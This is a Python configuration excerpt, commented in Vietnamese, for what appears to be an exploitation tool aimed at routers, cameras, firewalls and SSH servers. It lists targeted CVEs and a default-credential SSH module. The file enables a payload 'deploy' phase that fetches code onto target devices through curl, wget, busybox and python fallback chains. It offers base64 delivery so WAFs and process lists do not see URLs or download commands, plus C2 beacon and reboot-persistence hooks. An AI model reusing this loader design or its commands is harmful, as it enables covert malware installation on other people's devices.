#       base64  → request/WAF/proc-list chỉ thấy `B=<b64>; printf|base64 -d|sh`
#                 (không lộ URL + keyword curl/wget/unzip plaintext).
#       plain   → gửi script thô, tự escape nháy đơn an toàn.
#       auto    → base64 khi EDR_OBFUSCATE=True, ngược lại plain.
#   DEPLOY_ATTEMPTS : số vòng thử lại (mỗi vòng quét mọi mirror) — mirror chết
#                     không giết cả chuỗi deploy.
#   DEPLOY_MIN_SIZE : file nhỏ hơn ngưỡng (byte) = tải lỗi/trang chặn → loại.
#   DEPLOY_REQUIRE_HASH : True = thiếu công cụ tính SHA-256 cũng HỦY (fail-closed);
#                         False = chỉ hủy khi hash TÍNH ĐƯỢC mà SAI.
#   DEPLOY_FETCHERS/EXTRACTORS/HASH_TOOLS : danh sách lệnh shell thử lần lượt
#       (curl→wget→busybox→python) — biến `$u/$f` (fetch), `$F` (extract/hash).
#   DEPLOY_RUN_CMD : lệnh chạy chính sau khi vào thư mục payload.
#   DEPLOY_BEACON/DEPLOY_PERSIST : hook tùy chọn (mặc định TẮT).
DEPLOY_ENABLED = True        # BẬT — cho phép pha verifier tải/cài payload từ DEPLOY_URLS.
DEPLOY_DELIVERY = "plain"    # "base64" | "plain" | "auto" (không dùng khi đã tắt)
DEPLOY_STAGING_DIR = "/tmp"  # nơi tải/giải nén trên thiết bị (không dùng khi tắt)
DEPLOY_RANDOMIZE = True      # True = tên file/thư mục ngẫu nhiên mỗi lần
DEPLOY_ATTEMPTS = 2          # số vòng thử lại qua các mirror
DEPLOY_MIN_SIZE = 1024       # byte tối thiểu (0 = bỏ kiểm tra)
DEPLOY_KEEP_ARCHIVE = False  # True = giữ file zip sau khi giải nén
DEPLOY_REQUIRE_HASH = True   # fail-closed khi thiếu công cụ hash (an toàn hơn)
DEPLOY_RUN_SETUP = False     # AN TOÀN: không tự chạy `sh setup.sh`
DEPLOY_ENTRY_HINTS = ["main.py", "setup.sh"]   # dò thư mục vào (zip bọc thêm lớp)
DEPLOY_RUN_CMD = ""          # AN TOÀN: KHÔNG tự chạy scanner trên thiết bị đích.
DEPLOY_USE_TIMEOUT = True    # bọc `timeout DEPLOY_MAX_TIME` nếu có chạy
DEPLOY_MAX_TIME = 120        # giây — chỉ dùng khi DEPLOY_USE_TIMEOUT
DEPLOY_BEACON = False        # True = gọi beacon sau khi cài (xác nhận)
DEPLOY_BEACON_CMD = ""       # VD: "curl -fsS -o /dev/null http://C2/b/<tag>"
DEPLOY_PERSIST = False       # True = chạy lệnh persist (tồn tại qua reboot)
DEPLOY_PERSIST_CMD = ""      # AN TOÀN: không cài cơ chế tồn tại qua reboot.
DEPLOY_CLEANUP = True        # dọn thư mục staging nếu có chạy deploy
DEPLOY_CLEANUP_CMD = 'rm -rf "$S" 2>/dev/null || true'
# Chuỗi fetch thử lần lượt: biến `$u` (URL), `$f` (file đích); return 0 = thành công.
DEPLOY_FETCHERS = [
    'command -v curl >/dev/null 2>&1 && curl -fsSL --max-time 60 -o "$f" "$u" && return 0',
    'command -v wget >/dev/null 2>&1 && wget -q -T 60 -O "$f" "$u" && return 0',
    'command -v busybox >/dev/null 2>&1 && busybox wget -q -T 60 -O "$f" "$u" && return 0',
    'command -v python3 >/dev/null 2>&1 && python3 -c "import sys,urllib.request;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])" "$u" "$f" && return 0',
    'command -v python >/dev/null 2>&1 && python -c "import sys,urllib;urllib.urlretrieve(sys.argv[1],sys.argv[2])" "$u" "$f" && return 0',
]
# Chuỗi giải nén thử lần lượt: biến `$F` = file zip; return 0 = thành công.
DEPLOY_EXTRACTORS = [
    'command -v unzip >/dev/null 2>&1 && unzip -oq "$F" && return 0',
    'command -v busybox >/dev/null 2>&1 && busybox unzip -oq "$F" && return 0',
    'command -v python3 >/dev/null 2>&1 && python3 -m zipfile -e "$F" . && return 0',
]
# Chuỗi tính SHA-256 thử lần lượt: biến `$F`; in hash ra stdout; return 0 = thành công.
DEPLOY_HASH_TOOLS = [
    "command -v sha256sum >/dev/null 2>&1 && sha256sum \"$F\" | awk '{print $1}' && return 0",
    "command -v busybox >/dev/null 2>&1 && busybox sha256sum \"$F\" | awk '{print $1}' && return 0",
    "command -v openssl >/dev/null 2>&1 && openssl dgst -sha256 \"$F\" | awk '{print $NF}' && return 0",
    "command -v python3 >/dev/null 2>&1 && python3 -c \"import sys,hashlib;print(hashlib.sha256(open(sys.argv[1],'rb').read()).hexdigest())\" \"$F\" && return 0",
]

# ── CVSS severity (P1 — báo cáo HTML/CSV) ───────────────────────────────
# Điểm CVSS v3 best-effort từ advisory công khai (NVD/vendor/CISA KEV).
# QUAN TRỌNG: giá trị xấp xỉ — trước khi dùng cho báo cáo chính thức hãy
# đối chiếu NVD (nvd.nist.gov/vuln/detail/<CVE>) vì điểm có thể thay đổi
# theo thời gian/bảng CVSS. CVE nào thiếu → mặc định 0.0 (không xếp hạng).
CVE_SEVERITY = {
    "CVE-2017-17215": 8.8,   # Huawei HG532 UPnP RCE
    "CVE-2017-5638":  10.0,  # Apache Struts2 S2-045
    "CVE-2018-9866":  9.8,   # SonicWall GMS
    "CVE-2019-17621": 8.8,   # D-Link DIR-859
    "CVE-2020-8515":  9.8,   # DrayTek keyPath
    "CVE-2021-36260": 9.8,   # Hikvision
    "CVE-2021-46422": 9.8,   # Telesquare SDT-CW3B1
    "CVE-2022-30023": 8.8,   # Tenda HG9
    "CVE-2023-1389":  8.8,   # TP-Link Archer AX21
    "CVE-2023-25280": 8.0,   # D-Link DIR-820L (CISA KEV)
    "CVE-2023-27240": 8.8,   # Tenda AX3
    "CVE-2023-33538": 8.8,   # TP-Link TL-WR9xx
    "CVE-2024-3721":  9.8,   # TBK DVR
    "CVE-2024-45414": 9.8,   # ZTE httpd
    "CVE-2025-1316":  8.8,   # Edimax IC-7100
    "CVE-2025-29635": 8.8,   # D-Link DIR-823X
    "CVE-2025-34043": 9.8,   # Vacron NVR
    # Nâng cấp P1 — CVE mồ côi có module:
    "CVE-2018-9995":  9.8,   # XiongMai credential disclosure (unauth)
    "CVE-2022-30525": 9.8,   # Zyxel Firewall ZTP RCE
    "CVE-2018-13379": 10.0,  # FortiOS SSL-VPN path traversal (CISA KEV)
    "CVE-2018-0296":  7.7,   # Cisco ASA directory traversal (auth)
    # Nâng cấp P1 — CVE mồ côi còn lại (fingerprint_only hoặc deterministic):
    "CVE-2021-33044": 9.8,   # Dahua Web Service auth bypass (RPC2_Login)
    "CVE-2021-33045": 9.8,   # Dahua addAdmin (PoC disruptive — không implement)
    "CVE-2020-29583": 9.8,   # Zyxel firewall hardcoded admin (zyad5001)
    "CVE-2022-40684": 9.8,   # FortiOS/FortiProxy auth bypass (CISA KEV)
    "CVE-2018-14847": 9.8,   # MikroTik Winbox directory traversal (CISA KEV)
    "CVE-2021-35395": 9.8,   # Realtek Jungle SDK (AP-Router) buffer overflow
    "CVE-2023-30799": 7.2,   # MikroTik RouterOS priv-esc admin→super-admin (NVD)
    "CVE-2023-22945": 4.3,   # Netgear R7000 (NVD 4.3 — PoC chưa chắc chắn)
    # Lưu ý: CVE-2021-3373, CVE-2024-30877 KHÔNG có bản ghi NVD (RESERVED) —
    # đã đăng ký fingerprint_only nhưng không gán severity để tránh bịa số liệu.
    # Nâng cấp 2026-09 — cụm CVE SSH (cổng 22):
    "CVE-2024-6387":  8.1,   # OpenSSH sshd regreSSHion RCE (NVD 8.1)
    "CVE-2018-10933": 9.1,   # libssh server auth bypass (NVD 9.1)
    "CVE-2024-3094":  10.0,  # xz-utils/liblzma backdoor sshd (NVD 10.0)
    "CVE-2023-48795": 5.9,   # Terrapin SSH prefix truncation (NVD 5.9)
    "CVE-2021-41617": 7.0,   # OpenSSH sshd priv-esc (NVD 7.0)
    "CVE-2023-38408": 9.8,   # OpenSSH ssh-agent RCE (NVD 9.8)
    "CVE-2016-7406":  9.8,   # Dropbear dbclient format string (NVD 9.8)
    "CVE-2020-14145": 5.9,   # OpenSSH client info leak (NVD 5.9)
    "CVE-2016-6210":  5.3,   # OpenSSH username enumeration (NVD 5.3)
    # Nâng cấp 2026-10 — pseudo-CVE (KHÔNG phải CVE thật): kết quả đăng nhập
    # SSH bằng mật khẩu mặc định/yếu + thực thi lệnh (exploits/ssh_creds.py).
    # Điểm 9.8 = chiếm toàn quyền shell qua credential mặc định.
    "SSH-DEFAULT-CREDS": 9.8,
}

# Ngưỡng severity theo CVSS v3 để xếp nhãn trong report.
SEVERITY_LEVELS = [
    (9.0, "Critical"), (7.0, "High"), (4.0, "Medium"), (0.1, "Low"), (0.0, "Info"),
]
















